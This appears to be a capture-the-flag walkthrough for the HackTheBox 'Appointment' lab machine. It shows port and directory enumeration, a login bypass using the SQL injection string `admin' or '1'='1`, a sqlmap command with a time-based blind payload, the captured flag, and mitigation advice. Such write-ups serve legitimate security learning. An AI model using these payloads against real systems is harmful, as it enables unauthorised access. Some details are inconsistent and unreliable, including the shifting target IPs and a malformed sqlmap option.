# HTB Starting Point - Appointment

Box: Appointment  
Category: Starting Point  
OS: Linux  
IP: 10.129.152.109  
Spoiler level: Full walkthrough

---

## TL;DR
Login page exposes an SQL injection vulnerability; a simple tautology in the username field (e.g., `admin' or '1'='1`) grants access and reveals the flag.

---

## Enumeration

```
nmap -sC -sV 10.129.151.78
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-06 04:13 -0400
Nmap scan report for 10.129.151.78
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

- Nmap summary
  - Open ports:  80/tcp http
  - Services & versions: Apache 2.4.38
  

- Web findings

```
gobuster dir -u http://10.129.151.78 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.151.78
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 315] [--> http://10.129.151.78/images/]
css                  (Status: 301) [Size: 312] [--> http://10.129.151.78/css/]
js                   (Status: 301) [Size: 311] [--> http://10.129.151.78/js/]
vendor               (Status: 301) [Size: 315] [--> http://10.129.151.78/vendor/]
fonts                (Status: 301) [Size: 314] [--> http://10.129.151.78/fonts/]
Progress: 10571 / 87663 (12.06%)^C
```

- Did not find any useful directories during this run.
- The web application presents a login form (see screenshots).

Screenshots (placeholders)
- ![Screenshot 01 — login input with payload](screenshots/01_login.png)  (close-up showing `admin' #` username)
- ![Screenshot 02 — flag page](screenshots/02_flag.png)  (congratulations / flag)
- ![Screenshot 03 — full login page](screenshots/03_login_full.png)  (full view)
- ![Screenshot 04 — sqlmap output](screenshots/04_sqlmap.png)  (sqlmap confirms injection)

---

## Initial Foothold (User)

Step-by-step, reproducible commands that lead to initial access. Include exact commands, relevant payloads, and sanitized outputs.

1. Finding the vector
   - While inspecting web page, GET requests had no cookies and no error message was shown when trying to manually enter credentials.
   - Screenshot: login.png

2. Proof-of-concept / exploit attempt
   - I tried testing login and password form for basic SQL injections:
     - `admin' or '1'='1` and then put any password. As a result got redirected to a page with flag.
   - Screenshot: credentials.png
   - Screenshot: flag.png

Example escalation route:

Another way to get the flag is to use Sqlmap. I used a command:

```
sqlmap -u http://10.129.152.109/ -data="username=admin&password=pass" -p username --batch
```

Results were:

```
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8435 FROM (SELECT(SLEEP(5)))urEU) AND 'zZQY'='zZQY&password=pass
```

Screenshot: sqlmap.png

---

## Flag
- Flag retrieved after successful login: `e3d0796d002a446c0e622226f42e9672`

---

## Lessons Learned
- Reviewed different payloads for SQL injections and use of sqlmap for web page testing.
- Manual payloads (`' or '1'='1`) are useful for quick verification; sqlmap confirms injection type and can enumerate further.

---

## Mitigations & Hardening
- Validate and parameterize database queries on the server side (use prepared statements / parameterized queries).
- Avoid concatenating user input into SQL statements; enforce strict input handling.
- Rate-limit and monitor suspicious login attempts and anomalous request patterns.
- Employ WAF rules to catch common SQL injection payload signatures.

---
